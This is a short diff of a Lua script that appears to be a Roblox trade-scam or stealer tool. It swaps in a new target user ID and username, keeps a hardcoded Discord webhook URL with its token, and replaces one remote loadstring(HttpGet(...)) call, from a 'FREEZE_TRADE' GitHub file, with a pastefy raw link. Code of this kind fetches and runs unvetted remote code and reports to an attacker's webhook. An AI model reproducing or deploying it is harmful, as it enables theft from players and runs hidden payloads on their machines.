@@ -1,5 +1,5 @@
-local TARGET_ID = 10970530782
-local TARGET_USER = "sabpbaba"
+local TARGET_ID = 4966334571
+local TARGET_USER = "PortekizliMessi41"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1572708736638918666/VxwRHeEaJx4-67x89Po-K9385GZd9_a_6CkLpcEJ2sHYggfIe8IVZa9gJkjLc5xQQosD"
 
 local TargetBrainrots = {
@@ -224,7 +224,7 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/FREEZE_TRADE/refs/heads/main/.lua"))()
+    loadstring(game:HttpGet("https://pastefy.app/QPKLQlEE/raw"))()
 
     task.wait(1)
 
